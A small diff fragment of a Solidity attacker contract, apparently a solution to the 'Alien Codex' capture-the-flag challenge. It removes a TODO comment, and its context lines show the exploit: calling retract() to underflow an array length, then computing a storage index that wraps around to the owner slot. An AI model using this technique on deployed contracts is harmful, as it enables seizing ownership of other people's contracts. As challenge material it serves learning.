@@ -42,7 +42,6 @@ contract AlienCodexAttacker {
         //retracting it will change the length to below its limits and cause an overflow
         target.retract();
         dynamicArrayPosition = keccak256(1);
-        //TODO: understand this math
         uint256 ownerSlot = ((2 ** 256) - 1) -
             uint256(keccak256(abi.encode(1))) +
             1;
